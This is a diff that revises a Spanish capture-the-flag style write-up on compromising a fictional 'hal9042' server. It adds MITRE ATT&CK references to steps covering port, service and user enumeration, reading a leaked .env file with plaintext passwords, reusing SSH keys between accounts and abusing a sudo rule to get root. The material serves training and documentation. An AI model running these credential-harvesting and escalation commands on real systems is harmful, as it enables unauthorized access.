@@ -1,7 +1,12 @@
 # Reconocimiento del servidor
-## Enumeración de puertos
 
-Lanzamos `ss -tulnp` para mostrar los puertos expuestos dentro de la máquina.
+Teniendo ya acceso interno al servidor, procedemos a iniciar la fase de **[Descubrimiento](https://attack.mitre.org/tactics/TA0007/) para evaloar la superficie de ataque disponible.
+
+## Descubrimiento de servicios
+
+### Enumeración de puertos
+
+Lanzamos `ss -tulnp` para mostrar **[los puertos expuestos](https://attack.mitre.org/techniques/T1049/)** dentro de la máquina.
 ```bash
 ss -tulnp
 Netid    State     Recv-Q    Send-Q        Local Address:Port         Peer Address:Port    Process
@@ -20,24 +25,15 @@ tcp      LISTEN    0         4096                   [::]:6060                 [:
 ```
 Puertos expuestos internamente a atender: `1337`, `7042`, `8000` (6060 es ssh, 5042 es el servidor).
 
-## Enumeración de servicios
-
+### Enumeración de servicios
+Enumeramos todos los **[servicios en el servidor](https://attack.mitre.org/techniques/T1007/)** que estén activos.
 ```bash
 systemctl list-unit-files --state=enabled
 UNIT FILE                              STATE   PRESET
 apport-autoreport.path                 enabled enabled
 tpm-udev.path                          enabled enabled
 apparmor.service                       enabled enabled
-apport.service                         enabled enabled
-blk-availability.service               enabled enabled
-cloud-config.service                   enabled enabled
-cloud-final.service                    enabled enabled
-cloud-init-local.service               enabled enabled
-cloud-init.service                     enabled enabled
-console-setup.service                  enabled enabled
-cron.service                           enabled enabled
-dmesg.service                          enabled enabled
-e2scrub_reap.service                   enabled enabled
+...
 finalrd.service                        enabled enabled
 flagd.service                          enabled enabled
 getty@.service                         enabled enabled
@@ -52,11 +48,13 @@ hal9042-web.service                    enabled enabled
 hal9042-whisper.service                enabled enabled
 hal9042d.service                       enabled enabled
 keyboard-setup.service                 enabled enabled
-
+...
 ```
+Nos lista un número de servicios que no tienen pinta de ser servicios del sistema por defecto, así que los tendremos en cuenta para una posterior exploración.
 
-## Usuarios y grupos
 
+### Usuarios y grupos
+Leemos el archivo **/etc/passwd** para obtener la **[lista de usuarios disponibles](https://attack.mitre.org/techniques/T1087/001/)** en el servidor.
 ```bash
 ...
 uuidd:x:104:105::/run/uuidd:/usr/sbin/nologin
@@ -74,13 +72,22 @@ ol:x:1004:1006::/home/ol:/bin/bash
 hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
 halrev:x:999:988::/opt/hal9042/reviewer:/usr/sbin/nologin
 ```
+Ya tenemos enumerados todos los usuarios disponibles por los que trasversar para acceder a root.
 
-#### PACO
+### Documentación relacionada
+
+- [T1049 - System Network Connections Discovery](https://attack.mitre.org/techniques/T1049/)
+- [T1007 - System Service Discovery](https://attack.mitre.org/techniques/T1007/)
+- [T1087.001 - Account Discovery: Local Account ](https://attack.mitre.org/techniques/T1087/001/)
+
+## Movimiento lateral: acceso a cuentas válidas
+
+### PACO
 
 Pasos para movimiento lateral `www-data` -> `paco`.
 Buscamos todos los archivos cuyo propietario sea el usuario **paco**.
 
-```
+```bash
 find / -user paco 2>/dev/null
 /home/paco
 /home/paco/notes
@@ -97,8 +104,9 @@ find / -user paco 2>/dev/null
 /home/paco/scripts/encrypt.py
 /var/mail/paco
 ```
-
-```
+Encontramos dos artefactos interesantes: `.env.old` y `encrypt.py`.
+Leemos el archivo .env.old:
+```bash
  cat /home/paco/.env.old
 # old deploy env — paco. delete this. (you will not delete this)
 DB_PASS=Moulinette2024!
@@ -107,9 +115,7 @@ SECRET_KEY=hal9042secret
 SSH_USER=paco
 SSH_PASS=Pac0_H4L_dev!
 ```
-
-`~/scripts/encrypt.py`
-
+Y ahora el archivo `~/scripts/encrypt.py`.
 ```python
 """
 ...
@@ -217,7 +223,7 @@ Al tener el archivo permisos de escritura por grupo, podemos ejecutar código co
 Usamos la clave privada de `wil` y el archivo `authorized_keys` de `sophie`
 para obtener terminal en ol desde ssh.
 
-```
+```bash
 AUTH_KEYS=$(cat /tmp/sophie.auth_keys)
 
 mkdir -p ~/.ssh && chmod 700 ~/.ssh
@@ -232,7 +238,7 @@ De aquí lo único que vamos a necesitar es el archivo `authorized_keys` present
 ### OL
 Tenemos permiso de ejecución como `sudo` para un comando.
 
-```
+```bash
 sudo -l
 
 Matching Defaults entries for ol on hal9042:
@@ -261,3 +267,11 @@ uid=0(root) gid=0(root) groups=0(root)
 ```
 
 Ya somos **root**.
+
+### Documentación relacionada
+
+- [T1552.004 - Unsecured Credentials: Private Keys](https://attack.mitre.org/techniques/T1552/004/)
+- [T1110.002 - Brute Force: Password Cracking]()
+- [T1021.004 - Remote Services: SSH]()
+
+- [CWE-261 - Weak Encoding for Password](https://cwe.mitre.org/data/definitions/261.html)
